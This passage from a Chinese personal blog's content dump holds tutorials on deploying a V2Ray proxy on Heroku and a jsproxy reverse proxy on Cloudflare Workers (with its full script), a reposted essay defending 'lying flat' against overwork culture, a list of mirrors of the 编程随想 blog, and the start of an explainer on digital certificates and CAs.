旗下云服务商，提供方便便捷的各种云服务，如服务器，数据库，监控，计算等等。并且他提供了免费版本，这使得我们这些平时想搞一些小东西的人提供了莫大的便捷，虽然他有时长和宕机的限制，但是对于个人小程序来说已经足够了。 V2Ray V2Ray（Project V）是一个优秀的开源网络代理工具，目前已经全平台支持Windows、Mac、Android、IOS、Linux等操作系统的使用。相对起Shadowsocks来说属于后起之秀，在混淆能力、兼容性、速度上有着独到的优点，V2Ray是一个不错的选择。 服务端部署 注册Heroku 很简单，根据官网的提示操作就行:https://signup.heroku.com/ 部署 点击下面的链接将v2ray部署到Heroku上： https://heroku.com/deploy?template=https://github.com/libsgh/v2ray-heroku.git App name 应用名称，可随意填写。 Choose a region 服务器所在位置，有美国和欧洲两个选择。 PROTOCOL v2ray所使用的协议，可以不用改动。 UUID 用户的连接ID，必须填写，可在这里随机生成一个：https://1024tools.com/uuid (只需复制一个即可，千万要注意保存)。 WS_PATH websocket路径,可以不用改动。 进行部署 点击最后的“Deploy app”即可。 这里可能会需要一点时间，看到下面的界面就说明部署成功了： 打开网页：https://app-name.herokuapp.com/ray (将app name替换为你在第一部中填写的名称)如果显示Bad Request 则说明v2ray服务端部署就绪。 客户端配置 这里以windows端的v2rayN(下载地址:https://github.com/2dust/v2rayN/releases)为例，其他客户端配置方法类似。 请严格按照以上信息填写，否则可能无法连接。 到这一步你的v2ray应该已经部署好了，如果还是无法连接的话可以在下方的评论区中提出问题。 故障排除 请确保v2rayN的代理已打开 请确保你的电脑时间准确 与北京时间相差不超过30秒： 北京时间: time_is_widget.init({China_z43d:{}}); 其他说明 伪装首页 请求/，返回3D元素周期表 HTML5测速 请求/speedtest/，返回html5-speedtest测速页面 文件下载速度测试 请求/test/，返回文件列表,可用于文件下载速度测试 其他说明 Heroku 为我们提供了免费的容器服务，我们不应该滥用它，所以本项目不宜长期使用. Heroku 的网络并不稳定，部署前请三思。 Heroku每个月有550小时的时长限制，只适合轻度使用用户. Heroku的实例半小时没有访问就会自动休眠,你可以使用Uptimebot定时访问来解决这个问题。 速度过慢请看这篇文章：https://blog.gd1214b.icu/post/P9MODAcdP/ 致谢 v2ray-heroku是github上的一个开源项目，本文部署时用到了其中的源代码。 ","link":"https://blog.gd1214b.icu/post/NbdQntVCG/"},{"title":"使用Cloudflare Worker搭建反向代理","content":" 请先阅读本站的免责声明:https://blog.gd1214b.icu/post/disclaimers/ 请遵循当地法律使用，如您有违反当地法律造成的责任，本站拒不承担. 前言 Cloudflare 推出了 Workers 服务，在国内一般叫它边缘计算。jsproxy 是个 Github 开源项目，可以通过 Cloudflare Workers 服务搭建一个反向代理服务器，这个反向代理服务器不需要安装在我们自己的 VPS 主机上，而是直接部署在 Cloudflare 节点上，这可以极大的降低我们自身 VPS 主机的性能损耗。 教程 1 打开Cloudflare，登录CLoudflare账户。（Cloudflare支持中文界面，操作前可先将界面语言调换只中文）； 2 创建Worker实例（创建前还要配置一下，这里就不多说了，可以根据自己的需求进行选择，免费的一天可以处理十万请求，正常来说很够用）； 3 将以下代码复制到左侧脚本框中； 'use strict' /** * static files (404.html, sw.js, conf.js) */ const ASSET_URL = 'https://etherdream.github.io/jsproxy' const JS_VER = 10 const MAX_RETRY = 1 /** @type {RequestInit} */ const PREFLIGHT_INIT = { status: 204, headers: new Headers({ 'access-control-allow-origin': '*', 'access-control-allow-methods': 'GET,POST,PUT,PATCH,TRACE,DELETE,HEAD,OPTIONS', 'access-control-max-age': '1728000', }), } /** * @param {any} body * @param {number} status * @param {Object&lt;string, string&gt;} headers */ function makeRes(body, status = 200, headers = {}) { headers['--ver'] = JS_VER headers['access-control-allow-origin'] = '*' return new Response(body, {status, headers}) } /** * @param {string} urlStr */ function newUrl(urlStr) { try { return new URL(urlStr) } catch (err) { return null } } addEventListener('fetch', e =&gt; { const ret = fetchHandler(e) .catch(err =&gt; makeRes('cfworker error:\\n' + err.stack, 502)) e.respondWith(ret) }) /** * @param {FetchEvent} e */ async function fetchHandler(e) { const req = e.request const urlStr = req.url const urlObj = new URL(urlStr) const path = urlObj.href.substr(urlObj.origin.length) if (urlObj.protocol === 'http:') { urlObj.protocol = 'https:' return makeRes('', 301, { 'strict-transport-security': 'max-age=99999999; includeSubDomains; preload', 'location': urlObj.href, }) } if (path.startsWith('/http/')) { return httpHandler(req, path.substr(6)) } switch (path) { case '/http': return makeRes('请更新 cfworker 到最新版本!') case '/ws': return makeRes('not support', 400) case '/works': return makeRes('it works') default: // static files return fetch(ASSET_URL + path) } } /** * @param {Request} req * @param {string} pathname */ function httpHandler(req, pathname) { const reqHdrRaw = req.headers if (reqHdrRaw.has('x-jsproxy')) { return Response.error() } // preflight if (req.method === 'OPTIONS' &amp;&amp; reqHdrRaw.has('access-control-request-headers') ) { return new Response(null, PREFLIGHT_INIT) } let acehOld = false let rawSvr = '' let rawLen = '' let rawEtag = '' const reqHdrNew = new Headers(reqHdrRaw) reqHdrNew.set('x-jsproxy', '1') // 此处逻辑和 http-dec-req-hdr.lua 大致相同 // https://github.com/EtherDream/jsproxy/blob/master/lua/http-dec-req-hdr.lua const refer = reqHdrNew.get('referer') const query = refer.substr(refer.indexOf('?') + 1) if (!query) { return makeRes('missing params', 403) } const param = new URLSearchParams(query) for (const [k, v] of Object.entries(param)) { if (k.substr(0, 2) === '--') { // 系统信息 switch (k.substr(2)) { case 'aceh': acehOld = true break case 'raw-info': [rawSvr, rawLen, rawEtag] = v.split('|') break } } else { // 还原 HTTP 请求头 if (v) { reqHdrNew.set(k, v) } else { reqHdrNew.delete(k) } } } if (!param.has('referer')) { reqHdrNew.delete('referer') } // cfworker 会把路径中的 `//` 合并成 `/` const urlStr = pathname.replace(/^(https?):\\/+/, '$1://') const urlObj = newUrl(urlStr) if (!urlObj) { return makeRes('invalid proxy url: ' + urlStr, 403) } /** @type {RequestInit} */ const reqInit = { method: req.method, headers: reqHdrNew, redirect: 'manual', } if (req.method === 'POST') { reqInit.body = req.body } return proxy(urlObj, reqInit, acehOld, rawLen, 0) } /** * * @param {URL} urlObj * @param {RequestInit} reqInit * @param {number} retryTimes */ async function proxy(urlObj, reqInit, acehOld, rawLen, retryTimes) { const res = await fetch(urlObj.href, reqInit) const resHdrOld = res.headers const resHdrNew = new Headers(resHdrOld) let expose = '*' for (const [k, v] of resHdrOld.entries()) { if (k === 'access-control-allow-origin' || k === 'access-control-expose-headers' || k === 'location' || k === 'set-cookie' ) { const x = '--' + k resHdrNew.set(x, v) if (acehOld) { expose = expose + ',' + x } resHdrNew.delete(k) } else if (acehOld &amp;&amp; k !== 'cache-control' &amp;&amp; k !== 'content-language' &amp;&amp; k !== 'content-type' &amp;&amp; k !== 'expires' &amp;&amp; k !== 'last-modified' &amp;&amp; k !== 'pragma' ) { expose = expose + ',' + k } } if (acehOld) { expose = expose + ',--s' resHdrNew.set('--t', '1') } // verify if (rawLen) { const newLen = resHdrOld.get('content-length') || '' const badLen = (rawLen !== newLen) if (badLen) { if (retryTimes &lt; MAX_RETRY) { urlObj = await parseYtVideoRedir(urlObj, newLen, res) if (urlObj) { return proxy(urlObj, reqInit, acehOld, rawLen, retryTimes + 1) } } return makeRes(res.body, 400, { '--error': `bad len: ${newLen}, except: ${rawLen}`, 'access-control-expose-headers': '--error', }) } if (retryTimes &gt; 1) { resHdrNew.set('--retry', retryTimes) } } let status = res.status resHdrNew.set('access-control-expose-headers', expose) resHdrNew.set('access-control-allow-origin', '*') resHdrNew.set('--s', status) resHdrNew.set('--ver', JS_VER) resHdrNew.delete('content-security-policy') resHdrNew.delete('content-security-policy-report-only') resHdrNew.delete('clear-site-data') if (status === 301 || status === 302 || status === 303 || status === 307 || status === 308 ) { status = status + 10 } return new Response(res.body, { status, headers: resHdrNew, }) } /** * @param {URL} urlObj */ function isYtUrl(urlObj) { return ( urlObj.host.endsWith('.googlevideo.com') &amp;&amp; urlObj.pathname.startsWith('/videoplayback') ) } /** * @param {URL} urlObj * @param {number} newLen * @param {Response} res */ async function parseYtVideoRedir(urlObj, newLen, res) { if (newLen &gt; 2000) { return null } if (!isYtUrl(urlObj)) { return null } try { const data = await res.text() urlObj = new URL(data) } catch (err) { return null } if (!isYtUrl(urlObj)) { return null } return urlObj } 4 点击保存并部署即可。 5 点击这里即可访问你搭建的反向代理网站: 如果你在搭建过程中遇到任何问题, 欢迎在下方的评论区里留言. ","link":"https://blog.gd1214b.icu/post/h7Wc7SF8X/"},{"title":"如何评价某媒体文章《「躺平」可耻，哪来的正义感？》？躺平真的可耻吗？","content":" 本文转自:https://www.zhihu.com/question/460776718/answer/1911149556 什么是当前社会语境下的“躺平”，我个人的理解就是日趋觉醒的（狭义范围内的）打工人和（广义范围内的）被压榨阶级，开始用摸鱼划水“反杀”资本群体、用佛系工作态度“反向剥削”剥削阶级、用放弃理想“回怼”满身爹味的既得利益集团。 正如一个很自嘲的段子：“只要我在工作时间偷懒，这种既不干活又能拿工钱的行为，不也是对老板的剥削吗？” 形势倒逼至此，已是矛盾迫近临界之态。 很多油头粉面的食肉者忍不住指责或阴阳怪气的内涵当代年轻人：“不热爱劳动、不热爱奋斗！” 这真的是对青年群体最恶毒的污蔑了，必须首先讨论清楚劳动的问题。 马克思认为，“劳动本身是一种自由自觉的实践活动，人之所以为人，而非动物，很重要的一点就在于有自觉性的劳动，这是人的本质属性之一。” 劳动是无罪的，乃至是光荣的，我们无产阶级甚至还有自己专门的节日：五一劳动节。 在过去的苏联和改开之前的中国，劳动节的重要性不亚于国庆节，庆贺游行的规模盛大异常，因为这是属于国家的主人——工农阶级的政治节日。 曾经的五一劳动节，天安门除了城楼正中悬挂毛主席画像，广场的东侧还会摆放马克思和恩格斯的画像，广场的西侧会摆放列宁和斯大林的画像。 这彰示着国家的政权属性与人民主体的地位。 劳动人民是光荣的，劳动人民也是最受到各领域尊重和爱护的。 劳动，就是工农阶级的本色，也是新中国“权力为谁服务”的导向。 幻想不劳而获、拒绝劳动的人或心理，不仅会被社会性的群体生产所排斥，同时压根也会被自我所排斥。 因为任何一个心智健全的人都必须在劳动中寻找自我价值，除非他不是个正常人，比如初生的婴儿或神志不清的智力障碍人士等等，没有自我价值意识，也就没有劳动欲望。 一些民间俚话，所谓的“闲不住”“待不住”“操不完的心”“一辈子都是累命”……就是这个道理。 所以，指责“不爱劳动、不爱奋斗”，肯定首先从人的社会属性层面就说不通。 遁身于群体之中的个体，其贡献生产力一定是自发自觉的，这不以人的意志为转移。 那么问题就来了：明明人人爱劳动、人人需要劳动，怎么今天的打工人们却自发地要躺平了呢？ 这在于一个本质是关乎于集体价值判断的问题：资本主义价值观的事实到来和统治，已经大大地破坏并扫除了一切单纯欲望的本源。 资本，会使劳动发生「异化」，它会将“追求自我价值的实现”变为“贡献剩余价值的聚集”。 如马克思所言：“劳动的异化性质明显的表现是：只要肉体的强制或其他强制一旦停止，人们就会像逃避鼠疫那样逃避劳动。异化的劳动，仅仅是为了生存的牺牲与折磨。” 这就是资本家“996是福报”、“奋斗理所应当”洗脑恶论的来源。 昨夜，共青团中央官博迫于某些压力，不得不亲自下场就“躺平”发声。它的意图很明显：想爹味十足地教育一番年轻人，扭转一下舆论被动局面。 然而，不出意料地评论区翻了车： 可以看看共青团的这幅海报，它列举的都是什么人：救灾救难的人民子弟兵，风雨无阻的边防戍边战士，舍生忘死的一线抗疫英雄——这些人都有什么共同点？ 他们是为集体而拼搏、为人民大众而献身、为最广泛的国家利益而奋斗！ 这就牵扯出了一个讨论、也是年轻人纷纷躺平的根源性缘由：我们是在为谁奋斗？是为包括自己在内的国家集体，还是为了某一个两个的资本家？ 前者，叫做“劳动人民身先士卒当家作主”；后者，叫做“被剥削阶层甘为奴役甘为仆狗”。 所谓“宁当国家一颗螺丝钉，不做资本家的一株韭”。 观察者网马前卒曾有鼓吹：“拒绝加班，无产阶级就和先进生产力分离了”、“无产阶级如果不对自己狠一点，是没有未来的！” 这种论调的错误在于，它偷换乃至隐藏了“剥削剩余价值”的概念。 说白了就是：无产阶级所谓的“对自己狠一点”，这种“狠一点”所额外创造的利润，归了谁？ 是归了身心俱疲（某些肝病肾病现在在996白领阶层中越来越低龄化）的自己，还是归了端坐塔尖、每天只靠着剪息票就能每秒钟净入百万的资本持有人？ 那些财阀大佬，在今天已有一个挥之不去的特征：早已不需要参与劳动，仅仅依靠资本增殖（吃利息、投资分红）就能保持巨额财富的时时增长。 也就是卢梭说的：“一个巨人与一个矮子在同一条道路上行走，他们每走一步都会使巨人拉大他与矮子之间的距离”。 你被人勒令“拼命奋斗”，可是你在为谁奋斗？ 年轻人自我标榜“躺平”，这实为一种无奈。 正如如果没有“骑手质疑饿了么变相降加班奖励”、“饿了么被曝为留骑手过春节而画大饼”、“外卖员吐槽1000元订单配送费仅5元”、“饿了么猝死员工被爆每天被扣3元”…诸如此类种种的极端压缩成本、拔高强榨剩余价值的行为，会有今年2月份饿了么骑手们的全国性大罢工吗？他们会去停止劳动、停止生产吗？ 你若问饿了么为什么不多招点人、不停止众包模式而完善劳资关系（匹配所有的险金社保）？ 人家资本家面对这种问题，估计能翻你一天一夜的白眼。 过去不久的货拉拉事件同理，你质问货拉拉平台为何不安装摄像头、不提高安全维护成本，货拉拉大boss估计要被逗乐：“还不如等到死了人，我届时再赔个钱划算呢！” 此前的滴滴顺风车莫不如此。 包括汽车巨头福特公司，曾经有过内部计算，没有投入安全设备的话，公司因为赔偿事故遇难的损失为49.5 million，而投入安全设备、修复安全隐患的总成本则为$137 million——资本果断选择了前者。 同理，饿了么同样不会“傻了吧唧”地多招骑手、多发奖金、多缴社保，它必须把骑手数量控制在一个“合理”的区间，既能让骑手不得不疯狂闯红灯，又能让闯红灯带来的死人风险被降到一个资本可接受的赔偿范围，最终实现GMV和利润的最大化。 大不了，还可以发明一个“请消费者宽容骑手”的戏码，发动无产阶级斗无产阶级，而资本则立于不败之地、两头坐收渔利。 如此局面下，被逼到悬崖边走投无路的骑手们，凭什么不能罢工？凭什么不能“躺平”？ 躺平，有错乎？ 昨夜共青团“教育无果”并被迫关闭评论区之后，今天又弄了个“补救措施”，继续想运用偷换概念的招数为“镇压躺平”站台： 我看到这一幕倒是内心毫无波澜，因为这一招率先玩出来的是谁？是他共青团中央等官媒吗？当然不。 不是别人，正是996福报论的发明者，马云。 早在2018年时，马云先生就创物垂范地为社会贡献了“996是福报”的伟大理论，从此辩论激荡绵延至今不止。 甚至马云先生自己都已经在人生滑铁卢中思考过往，某些人士依旧拿这位“马粑粑”的言论当做真理，乐此不疲地洗脑青年一代。 昨天共青团中央把钱学森等共和国国士大家搬出来的行为，和三年前的马云别无二致：直接把“国家”摆上辩论台，意图用政治正确来打压打工人：“两弹一星、核潜艇都是科学家们用996干出来的，你们这些年轻人还有不努力的理由？” 这叫杀人不见血。 用资本主义的剥削伦理去解构和解释毛主席时代的建设，这体现了一种无与伦比的统治高位的优越感，以及曲解、利用、无害化毛主席的极端卑劣。 两弹一星、核潜艇、大寨、杂交水稻，这些确实是无产阶级科学家和最广大工农与劳动人民群众用貌似996模式干出来的成就——但是！这些成就，造福的是谁？ 是全体中华民族的国运福祉，它永葆了中国的边境安宁和外交地位的抬升。 毛主席时代的“打工人”们，所创造的“剩余价值”都交给了国家，以“全民所有制”的形式储存下来，这是同今天的互联网财阀们最大之区别所在。 只不过到了90年代末期，一夜之间的私有化又使得众多公立的矿山、煤田、汽车厂被以白菜价卖给民企和外资，连祖辈们的养老金都要现在的工作者来支付。 推荐阅读：鸡架席卷沈阳的暗面：一九九八，工人下岗 今时今日，抱着一堆资本主义的理儿到处灌输鸡汤的资本家们所提倡的996，利润收纳的方向仅仅是私家的公司与身价而已。 这是私有制语境里的付出收益论。 用私有制逻辑，去套述毛泽东那一代领导人、带领全国人民勒紧裤腰带的奋斗岁月，这是对社会主义公有制、对艰苦年代里那些奉献青春不求回报的无产阶级革命家的乐观主义精神最卑鄙的侮辱。 侮辱一个制度的目的，是为了美化和粉饰另一个制度；正如消除自己对一个制度的恐惧，是为了助长自己对鼓吹另一个制度的勇气。 躺平的表象是一种自暴自弃，但深源则是困于阶级固化的无力感。 我微博有粉丝的这样一条评论： 这种想法，实质与前文提到的马前卒的论调是极为相似的，都是理想主义的想当然所思。 现今，「垄断」的作用，难道看不见吗？ 现在真要聚集一伙人，也开发一个外卖app（这不是什么难事），那结果只能是：你还没占领1/5你所在小城市的市场、日活量还没达到百人，现有的巨头财阀就会闻着味儿一手胡萝卜一手狼牙棒得来找你谈判了——“兄弟，要么我收购你，要么我大量发行代金券玩死你，你选一个吧！” 无产阶级拿什么和巨头斗？人家打价格战，人家打得起，你打得起吗？菜农们是怎么被社区团购那帮财阀给玩死的，还不清楚吗？ 现在有多少小公司创业者的人生目标已经极为简单，就是被阿里腾讯收购、成为阿里腾讯附庸。 你还让无产阶级自己去开发生产力，怎么开发？ 不准人家抱怨“蛋糕分不到手里”，还命令人家“有本事自己去做蛋糕啊”，可是做蛋糕的奶油、模具全都已掌握在巨头手里，你要么放弃，要么归降。 一没罢工权，二没扩张权，拿什么斗？ 正因如此，某些「奋斗B」乐于跪在资本家膝下鼓吹的“你讨厌996你可以辞职啊”，这种言论完全是无解的，连初中的教科书都给出过答案： “工人看似有签订契约的自由，但是他们不受雇于这个资本家，就得受雇于那个资本家，饥饿的威胁使他们无法摆脱被资本家雇佣、受资本家剥削和压榨的命运。在资本家占有生产资料的条件下，所谓雇佣双方的契约自由，对于工人来说，是徒有虚名的。” “打工人”为什么会在2020年爆梗？疫情的空前打击不可忽视，中国从去年春季迎来了近年最庞大的一波企业倒闭潮和工人失业潮，更有“最苦应届毕业生”的段子流传。 这正应了马克思的话：“以前的中间等级的下层，即小工业家、小商人和小食利者，手工业者和农民——所有这些阶级，都降落到无产阶级的队伍里来了。” 僧多粥少，挤压了打工者群体就业空间的同时，也给予了资本加大剥削和“择怂录用”的底气。 至于这帮肆意兼并的垄断巨头是怎么产生的，这我就不多说了，说了估计炸号……就如同讨论罢工权和游行权是怎么、又是为什么在80年代被取消的一样…… 五年前，外卖app是科技前卒；五年后，外卖功能竟然还是它的主业——用来为其金融信贷聚集用户的主业，这已经说明其科技性在下降了。 布雷弗曼说过：“技术的进步非但没有改变无产阶级的命运，反而成为了限制无产阶级的新枷锁。” 所以即便不说阶级情感，就是从生产力角度，「垄断」这种巨头形态应该被抛弃和消灭。 否则，就永远会造成“打工人必须匍匐在资本家胯下奋斗”、“不奋斗就没有未来”这种看似挺有道理、实际完全是颠倒社会主义分配原则的就业生态。 曾在微博见有一著名油腻食肉者的“镇压躺平”言论： 年轻时好好忍着被剥削，这样待到年老油腻时就可以去剥削别人了？ 即：安心做一个被剥削者的目的，是为了有朝一日可以去当一个剥削者？ 老老实实地“躺平”，就可以自然而然地“躺赢”吗？ 这种思维，其实就是“吃得苦中苦，方为人上人”这句改开之后极其政治正确的话。 “人上人”，人身之上亦有他人，这便构筑了一个阶级分明的压迫体系： 在这样的油腻小脑中，这种阶级分明的社会状态是非常光伟正的。 正如所言“20来岁有个屁的剩余价值”这种直接把“价值”与“剩余价值”偷换概念的蛮语，用意自然是为了叫嚷“加班无罪”、“跪舔有理”，进而对“躺平”进行镇压和肃反。 恐怕1886年芝加哥大罢工之前，工人每天劳作15个小时以上这种情况，在食肉者眼里皆是“正确”的、“合理”的。 且不说这种观点完全是反人道，也是反社会主义、反我国宪法精神、反共和国性质的——就说其具有之相当程度的欺骗性和阴谋性：它直接隐藏了一个事实：你今天苦忍着被剥削、苦忍着打在身上的皮鞭，真的有朝一日你就可以成为手拿皮鞭的持鞭人吗？你今天点头哈腰得“吃得苦中苦”，真的有一天你就可以成为獠牙翻覆的“人上人”吗？ 列宁导师在20世纪初就提出了一个概念：“食利阶层”：“资本主义的腐朽表现在以‘剪息票’为生的资本家这一庞大食利者阶层的形成。英、美、法、德四个先进帝国主义国家各拥有1000—1500亿法郎的有价证券资本，就是说，各国每年的收入都不少于50—80亿法郎。” 而迈克尔·桑德尔在公开课《公正》中则表达的更具象：“当今社会是一场高级经理人和食利者之间的赛跑，最终受损者则是在旁观赛的普通大众。” 那么什么是“高级经理人”？ 列宁指出：食利阶层往往会拿出一部分利润收买无产阶级中的精英分子，使他们“资产阶级化”，成为资产阶级在无产阶级中的“代理人”。 这就是我们所说的“工贼”： 常见于今天体制内的中层油腻小老头，和体制外市场中的财阀中层领导、中小企业老板，以及一大堆精神资本家。 这些人往往会在既得利益的体系中由于异常会舔（今天的话术叫做情商高、眼头活、会来事；本质则是比较擅于抛弃自己原本的阶级属性）而得到一丝丝高于底层工农的甜头。 于是他们便会摇身一变、为身处的既得利益体系以及这份体系事实上真正的顶层吸益人，大肆摇旗呐喊、奔走鼓吹——仿佛自己也是这个体系的顶端话事人一般，而忽略了自己其实也是一个被剥削者、也有太多需要去点头哈腰的时刻的事实——不论是体制内的权力程序，还是体制外的市场程序。 正如许多小企业主，平时对员工颐指气使、鼓吹966奋斗论，却忘了自己完全也是市场语境下的被剥削者、在公司背后的投资人面前也得装孙子的现实。 还是鲁迅先生警示被压榨的年轻人警示得好哇：“做奴隶虽然不幸，但并不可怕，因为知道挣扎，毕竟还有挣脱的希望；若是从奴隶生活中寻出美来，赞叹、陶醉，就是万劫不复的奴才了！” 附一段【毛泽东警卫员李银桥 回忆录片段】 毛主席转身，终于望住我：“你是哪里人呢？” “河北省安平县。” “父母干什么呢？” “我父亲种地拉脚，农闲倒腾点粮食买卖；母亲操持家务，农忙时节也下地。” “我们的家庭很相像嘛。你喜欢父亲还是喜欢母亲?” “喜欢母亲。我父亲脑子好，多少账也算不糊涂。可是脾气大，爱喝酒，吃饭他单独吃，他吃饼子我们啃窝头，稍不如意就打人。我母亲心善，对人好，我喜欢母亲。” “越说越一致了嘛。你母亲一定信佛。” “主席您怎么知道？” “你说她心善，出家人慈悲为怀。” 我目瞪口呆。听惯了政治课，我没想到毛主席会说出这样的话。同时，我又感到与主席突然近了，紧张和拘束消失许多。我小声问:“主席，您母亲也信佛吗？” “我也喜欢母亲。她也信佛，心地善良。小时候我还跟她一起去庙里烧过香呢。后来我不信了。你磕多少头，中国也强不起来，人民还是受苦。” 主席顿一顿，“磕头不如造反！” …………… “人人生而平等”这句话有没有问题？没问题，但它必须还有一个配套的下半句，叫做“造反有理”。 也就是毛泽东1939年在延安说的：“马克思主义的道理千条万绪，归根结底就是一句话：‘造反有理’。几千年来总是说压迫有理、剥削有理，而造反无理。自从马克思主义出来，就把这个旧案翻过来了，这是个大功劳，这个道理是无产阶级从斗争中得来的，而马克思作了结论。根据这个道理，于是就反抗，就斗争，就干社会主义。” 没有了“造反有理”这个配套的后缀，“人人生而平等”就成了一句扯淡的空谈，且反而会成为统治阶层洗脑下层的利器，割草都是割得润物无声。 刘建宏曾直言不讳地说过这样一段话：“你说我们是利益既得者吗？我想我们是。我们之前的人相对来说好动摇，他虽然挡在你面前，你稍微动一动，他就让位了。但是后面的人要想让我去让位，不是很容易。这个事我跟（白）岩松探讨过很长时间，我说你看到你后面的威胁了吗？他说真没看到，我说，我也没看到。” 那么此时，羸弱的“草”们所能做的，也就是“躺平”了。 跋 从“丧文化”到“佛系”，从“沙雕”到“打工人”，下游的被压榨群体们在互联网上不断地寻找着共鸣、创造着新词。 或是集体颓唐，或是集体装疯卖傻……总之，他们心里都是很清楚的：活着很苦，苦中作乐得了。 5月初，已然颇具政治危机、社会维稳要务之势的七普数据，在官方此前连续用韩国、日本、美国等国的人口形势来给民众“做足思想准备”之后，终于出炉。 数据显示：年轻人不愿意生孩子了，连带着的还包括婚姻抵触、恋爱抵触、社交抵触。 这又何尝不也是一种“躺平”？ 教育成本、购房成本、996剥削、延迟退休……试问拿什么来遏制“躺平”？又有什么理由去指责“躺平”？ 很多时候不禁想问：拼多多还要再跳楼几人？马云外滩宣战演讲还要再来几场？十八大之前那帮在舆论场舞动话筒的高校公知教授和直到今天都老而不死的HS一代，以及贾浅浅炫耀权力一般的“屎尿屁文学”，还嫌不够？ 底层愈发内卷，高层愈发稳固。 90后们今天无可奈何的“躺平”，难道不是对一百年前同是一群“90后”的革命先辈们用2000万牺牲规模才换来一个社会主义新中国的血泪革命史的一种讽刺吗？ “建立新中国死了多少人，有谁想过这个问题？我是想过的！” ——毛泽东。 “只有群众的革命斗争，才能使工人生活和国家管理真正有所改善。无论有教养的人怎样‘同情’工人，无论单个恐怖分子怎样英勇斗争，都不能摧毁沙皇专制制度和资本家专横势力。只有工人自己起来斗争只有千百万群众共同斗争才能做到这一点——而当这种斗争减弱下去的时候，工人所争得的成果立刻就开始被夺回去。俄国的革命证实了国际歌中的一段歌词：‘从来就没有什么救世主，也不靠神仙皇帝。要创造人类的幸福，全靠我们自己！’” ——列宁。 ","link":"https://blog.gd1214b.icu/post/BS6mLI2Ud/"},{"title":"编程随想的博客备份","content":"最近著名中文匿名博主【编程随想】自5月9日起长时间静默，疑似被捕，在海内外中文舆论圈中引发轩然大波。本文列出了几个编程随想的博客备份. 编程随想的博客备份 在线备份 GitHub Pages : https://gd1214b.github.io/program-think/ Cloudflare Pages ： https://program-think.pages.dev/ Vercel : https://program-think.vercel.app/ Netlify : https://program-think.netlify.app/ Bitbucket Pages : https://gd1214b.bitbucket.io/ 源代码备份 GitHub : https://github.com/gd1214b/program-think/ GitLab : https://gitlab.com/gd1214b/program-think/ Bitbucket : https://bitbucket.org/gd1214b/gd1214b.bitbucket.io/ ","link":"https://blog.gd1214b.icu/post/myyQXbG7P/"},{"title":"数字证书及 CA 的扫盲介绍","content":" 本文转自:https://program-think.blogspot.com/2010/02/introduce-digital-certificate-and-ca.html 先说一个通俗的例子 普通的介绍信 想必大伙儿都听说过介绍信的例子吧？假设 A 公司的张三先生要到 B 公司去拜访，但是 B 公司的所有人都不认识他，他咋办捏？常用的办法是带公司开的一张介绍信，在信中说：兹有张三先生前往贵公司办理业务，请给予接洽......云云。然后在信上敲上A公司的公章。 张三先生到了 B 公司后，把介绍信递给 B 公司的前台李四小姐。李小姐一看介绍信上有 A 公司的公章，而且A公司是经常和 B 公司有业务往来的，这位李小姐就相信张先生不是歹人了。 说到这，爱抬杠的同学会问了：万一公章是伪造的，咋办捏？在此，俺要先声明，在本例子中，先假设公章是难以伪造滴，否则俺的故事没法说下去鸟。 引入中介机构的介绍信 好，回到刚才的话题。如果和 B 公司有业务往来的公司很多，每个公司的公章都不同，那前台就要懂得分辨各种公章，非常滴麻烦。所以，有某个中介公司 C，发现了这个商机。C公司专门开设了一项“代理公章”的业务。 今后，A 公司的业务员去B公司，需要带2个介绍信： 介绍信1 含有 C 公司的公章及 A 公司的公章。并且特地注明：C 公司信任A公司。 介绍信2 仅含有 A 公司的公章，然后写上：兹有张三先生前往贵公司办理业务，请给予接洽......云云。 某些不开窍的同学会问了，这样不是增加麻烦了吗？有啥好处捏？ 主要的好处在于，对于接待公司的前台，就不需要记住各个公司的公章分别是啥样子的；他/她只要记住中介公司 C 的公章即可。当他/她拿到两份介绍信之后，先对“介绍信1”的 C 公章，验明正身；确认无误之后，再比对“介绍信1”和“介绍信2”的两个 A 公章是否一致。如果是一样的，那就可以证明“介绍信2”是可以信任的了。 相关【专业术语】的解释 费了不少口水，终于说完了一个俺自认为比较通俗的例子。如果你听到到这儿，还是想不明白这个例子在说啥，那后续的内容，就不必浪费时间听了 😦 下面，俺就着上述的例子，把相关的名词，作一些解释。 “证书”是啥？ “证书”洋文也叫“digital certificate”或“public key certificate” 它是用来证明某某东西确实是某某东西的东西（是不是像绕口令？）。通俗地说，证书就好比例子里面的公章。通过公章，可以证明该介绍信确实是对应的公司发出的。 理论上，人人都可以找个证书工具，自己做一个证书。那如何防止坏人自己制作证书出来骗人捏？请看后续 CA 的介绍。 “CA”是啥？ CA 是“Certificate Authority”的缩写，也叫“证书授权中心”。 它是负责管理和签发证书的第三方机构，就好比例子里面的中介——C 公司。一般来说，CA 必须是所有行业和所有公众都信任的、认可的。因此它必须具有足够的权威性。就好比A、B两公司都必须信任 C 公司，才会找 C 公司作为公章的中介。 “CA 证书”是啥？ CA 证书，顾名思义，就是CA颁发的证书。 前面已经说了，人人都可以找工具制作证书。但是你一个小破孩制作出来的证书是没啥用处的。因为你【不是】权威的 CA 机关，你自己搞的证书不具有权威性。 这就好比上述的例子里，某个坏人自己刻了一个公章，盖到介绍信上。但是别人一看，不是【受信任】的中介公司的公章，就不予理睬。坏蛋的阴谋就不能得逞啦。 文本后续提及的证书，若无特殊说明，均指 CA 证书。 啥是证书之间的【信任关系】？ 在俺的例子里谈到，引入中介后，业务员要同时带两个介绍信。第一个介绍信包含了两个公章，并注明，公章C信任公章A。证书间的信任关系，就和这个类似。就是用一个证书来证明另一个证书是真实可信滴。 啥是证书的【信任链】？ 实际上，证书之间的信任关系，是可以嵌套的。比如，C 信任 A1，A1 信任 A2，A2 信任 A3......这个叫做证书的信任链。只要你信任链上的头一个证书，那后续的证书，都是可以信任滴。 啥是【根证书】？ “根证书”的洋文叫“root certificate”。为了说清楚根证书是咋回事，再来看个稍微复杂点的例子。 假设 C 证书信任 A 和 B；然后 A 信任 A1 和 A2；B 信任 B1 和 B2。则它们之间，构成如下的一个树形关系（一个倒立的树）。 处于最顶上的树根位置的那个证书，就是“根证书”。除了根证书，其它证书都要依靠上一级的证书，来证明自己。那谁来证明“根证书”可靠捏？实际上，根证书自己证明自己是可靠滴（或者换句话说，根证书是不需要被证明滴）。 聪明的同学此刻应该意识到了：根证书是整个证书体系安全的根本。所以，如果某个证书体系中，根证书出了问题（不再可信了），那么所有被根证书所信任的其它证书，也就不再可信了。这个后果是相当相当滴严重（简直可以说是灾难性的）。 证书有啥用？ CA 证书的作用有很多，俺为了节省口水，只列出常用的几个。 验证网站是否可信（针对 HTTPS） 